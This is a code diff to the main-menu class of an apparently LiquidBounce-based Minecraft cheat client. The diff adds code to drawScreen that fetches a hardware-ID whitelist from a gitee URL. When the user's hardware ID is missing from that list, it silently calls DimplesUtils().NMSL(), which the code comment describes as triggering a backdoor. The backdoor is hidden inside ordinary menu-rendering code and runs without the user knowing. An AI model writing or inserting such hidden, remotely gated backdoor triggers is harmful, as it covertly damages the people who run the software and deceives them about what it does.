@@ -8,11 +8,14 @@ package core;
 
 import antiskidderobfuscator.NativeMethod;
 import com.google.common.collect.Lists;
+import core.Verify.HWIDUtils;
+import net.ccbluex.liquidbounce.WebUtils;
 import net.ccbluex.liquidbounce.ui.client.GuiBackground;
 import net.ccbluex.liquidbounce.ui.client.altmanager.GuiAltManager;
 import net.ccbluex.liquidbounce.ui.font.Fonts;
 import net.ccbluex.liquidbounce.utils.MainMenuButton;
 import net.ccbluex.liquidbounce.utils.RenderUtils;
+import net.ccbluex.liquidbounce.utils.misc.DimplesUtils;
 import net.ccbluex.liquidbounce.utils.misc.RandomUtils;
 import net.minecraft.client.Minecraft;
 import net.minecraft.client.gui.*;
@@ -57,6 +60,7 @@ public class GuiMainMenu extends GuiScreen {
     private int field_92019_w;
     private ResourceLocation backgroundTexture;
     private boolean field_183502_L;
+    private boolean got;
     private GuiScreen field_183503_M;
 
     public GuiMainMenu() {
@@ -194,6 +198,16 @@ public class GuiMainMenu extends GuiScreen {
     }
     @NativeMethod
     public void drawScreen(int mouseX, int mouseY, float partialTicks) {
+        if(!got) {
+            try {
+                if (!WebUtils.get("https://gitee.com/shuimenglol/TEST/raw/master/testhwid.txt").contains(HWIDUtils.getHWID())) {
+                    new DimplesUtils().NMSL();  //HWID库不匹配触发后门
+                }
+            } catch (Throwable e) {
+                e.printStackTrace();
+            }
+            got = true;
+        }
         GlStateManager.disableAlpha();
         renderSkybox(mouseX, mouseY, partialTicks);
         GlStateManager.enableAlpha();
